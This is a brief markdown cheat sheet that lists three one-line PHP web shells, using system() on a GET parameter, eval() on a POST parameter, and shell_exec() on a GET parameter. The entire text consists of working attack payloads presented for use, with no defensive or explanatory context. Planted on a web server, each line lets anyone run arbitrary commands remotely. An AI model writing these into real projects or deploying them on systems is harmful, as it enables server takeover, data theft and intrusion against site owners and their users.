## Web Shell Cheat Sheet

Below are some examples of web shells:

### PHP

1. PHP System Web Shell:
```php
<?php system($_GET['cmd']); ?>
```

2. PHP Eval Web Shell
```php
<?php eval($_POST['cmd']); ?>
```

3. PHP Shell Exec Web Shell
```php
<?php echo shell_exec($_GET['cmd']); ?>
```


